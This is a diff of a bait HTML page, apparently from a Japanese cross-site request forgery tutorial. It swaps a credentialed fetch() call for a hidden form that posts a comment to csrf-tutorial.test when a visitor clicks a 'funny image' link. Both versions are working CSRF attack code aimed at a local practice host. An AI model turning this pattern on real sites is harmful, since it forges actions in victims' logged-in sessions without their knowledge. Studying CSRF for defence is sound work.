@@ -7,25 +7,18 @@
 </head>
 <body>
   <h1>😈 怪しくないサイト 😈</h1>
-  <a href="#" id="link">超面白い画像はこちら！→</a>
+  <a href="/photo.html" id="link" target="_blank">超面白い画像はこちら！→</a>
+
+  <form action="#" method="post" name="trap" style="display: none;">
+    <input type="hidden" name="body" value="罠サイトからこんにちは" />
+  </form>
 
   <script>
+    const targetURL = 'http://csrf-tutorial.test/comments/create';
     const link = document.getElementById('link');
     link.addEventListener('click', function(e) {
-      e.preventDefault();
-
-      const formData = new FormData();
-      formData.append('body', '罠サイトからこんにちは');
-
-      fetch('http://csrf-tutorial.test/comments/create', {
-        method: 'POST',
-        mode: 'no-cors',
-        credentials: 'include',
-        body: formData
-      })
-        .then(response => {
-          location.href = '/photo.html';
-        });
+      document.forms.trap.action = targetURL;
+      document.forms.trap.submit();
     });
   </script>
 </body>
